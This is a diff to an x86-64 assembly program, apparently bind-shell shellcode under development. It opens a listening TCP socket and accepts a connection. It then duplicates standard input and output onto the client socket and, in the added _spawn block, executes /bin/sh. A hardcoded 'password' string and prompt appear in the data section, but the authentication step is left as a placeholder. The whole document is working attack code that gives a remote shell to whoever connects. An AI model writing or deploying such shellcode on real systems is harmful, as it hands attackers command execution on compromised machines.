@@ -1,13 +1,12 @@
 global _start
-
 section .text
 
 _start:
-	mov rbp, rsp		; Set stack base
-	jmp _data		; Find string address
+	mov rbp, rsp
+	jmp _data	  	; Find string address
 
 _main:
-	pop r15 		; Keep reference to strings
+	pop r15 	  	; Keep reference to strings
 
 ; Build a server sockaddr_struct on the stack
 	xor rax, rax
@@ -16,26 +15,27 @@ _main:
 	shl rax, 16
 	add ax, 2
 	push rax
-	
-; Create Socket
+
+; Create Socket	
 	xor rax, rax
 	mov rdx, rax
 	inc rax
-	mov rsi, rax	; SOCK_STREAM (1)
+	mov rsi, rax	  	; SOCK_STREAM (1)
 	inc rax
-	mov rdi, rax	; AF_INET (2)
-	add rax, 39	; SysCall 41
+	mov rdi, rax	  	; AF_INET (2)
+	add rax, 39	  	; syscall 41
 	syscall
 	cmp rax, -1
 	jle _exit
-	push rax ; Store socket id on stack
+	push rax 	  	; store socket id on stack
 
-_bind: ; Bind the Socket
-	mov rdi, [rbp-24] ; svr_sock id
-	lea rsi, [rbp-16]  ; sockaddr_in struct
-	mov rdx, 16	; sockaddr_in size
+; Bind the Socket
 	xor rax, rax
 	add rax, 49
+	mov rdi, [rbp-24]  	; socket id
+	lea rsi, [rbp-16]  	; sockaddr_in struct
+	mov rdx, 16	  	; sockaddr_in size
+	push rdx	  	; create size val ref on stack
 	syscall
 	cmp rax, -1
 	jle _exit
@@ -50,22 +50,25 @@ _bind: ; Bind the Socket
 	jle _exit
 	nop
 
-	mov rax, 16
-	push rax
-
-_accept:	; Accept a connection
-	lea rsi, [rbp-16]
-	mov rax, 43
-	lea rdx, [rbp-24]
+_accept:			; Accept a connection
+	xor rax, rax
+	add rax, 43
+	mov rdi, [rbp-24]  	; socket id
+	lea rsi, [rbp-16] 	; sockaddr_in struct
+	lea rdx, [rsp]		; pointer to sockaddr_in size
 	syscall
 	cmp rax, -1
 	jle _exit
-	push rax
-	nop
 
-_dup:
+; Do auth stuff here
+
+	push rax		; Store client socket id
+
+; Duplicate I/O descriptors 
+	mov r10, rax
 	mov r8, 33
 	mov rax, r8
+	mov rdi, r10
 	xor rsi, rsi
 	syscall 
 
@@ -77,15 +80,27 @@ _dup:
 	inc rsi
 	syscall
 
+_spawn: ; Spawn shell
+	xor rax, rax
+	push rax
+	mov rbx, 0x68732f6e69622f78
+	shr rbx, 8
+	push rbx
+	mov rdi, rsp
+	mov rsi, [rbp-56]
+	xor rdx, rdx
+	add rax, 0x59
+	syscall
 	nop
-
+	
 _exit:
 	mov rax, 0x3c
 	mov rbx, 1
 	syscall	
-	nop
+
 _data:
 	call _main
+	shell:	db "/bin/sh", 0x0
 	prompt: db "Speak friend and enter: "
 	pass:	db "password", 0xa
 	good:	db "Welcome", 0xa
